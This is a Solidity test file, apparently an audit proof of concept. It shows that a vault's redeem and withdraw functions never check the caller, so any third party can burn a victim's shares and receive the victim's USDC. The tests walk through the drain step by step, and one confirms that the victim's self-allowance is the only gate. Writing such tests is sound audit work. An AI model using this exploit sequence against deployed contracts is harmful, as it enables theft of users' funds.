// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./SettleBase.t.sol";

/// Lead L1: WERC7575Vault.withdraw/redeem never check msg.sender == owner or an owner->caller allowance.
/// The only check is spendSelfAllowance(owner) — the owner's SELF-allowance, which every user who can
/// transfer holds (validator permit). Any third party can burn a victim's shares and receive the assets.
contract VaultAuthTest is SettleBase {
    function test_anyoneCanRedeemVictimSharesToThemselves() public {
        uint256 shares = depositFor(alice, 100_000e6);
        grantSelfAllowance(alice, type(uint256).max); // alice enabled for transfers (normal state)

        // attacker has no KYC, no allowance from alice, nothing
        assertEq(shareToken.allowance(alice, attacker), 0);
        vm.prank(attacker);
        vault.redeem(shares, attacker, alice);

        assertEq(usdc.balanceOf(attacker), 100_000e6, "attacker received alice's USDC");
        assertEq(shareToken.balanceOf(alice), 0, "alice's shares burned");
    }

    /// Same via withdraw(), with a limited (non-infinite) self-allowance: attacker drains up to it.
    function test_anyoneCanWithdrawUpToVictimSelfAllowance() public {
        depositFor(alice, 100_000e6);
        grantSelfAllowance(alice, 40_000e18);
        vm.prank(attacker);
        vault.withdraw(40_000e6, attacker, alice);
        assertEq(usdc.balanceOf(attacker), 40_000e6);
    }

    /// Disproof check: a V12-style "fix" (spend owner->vault allowance instead) would still not stop it
    /// unless the caller is checked — shown by the fact that nothing about the caller is ever read.
    /// Here: without self-allowance the attack fails, confirming self-allowance is the only gate.
    function test_onlyGateIsVictimSelfAllowance() public {
        uint256 shares = depositFor(alice, 1_000e6);
        vm.prank(attacker);
        vm.expectRevert();
        vault.redeem(shares, attacker, alice);
    }
}
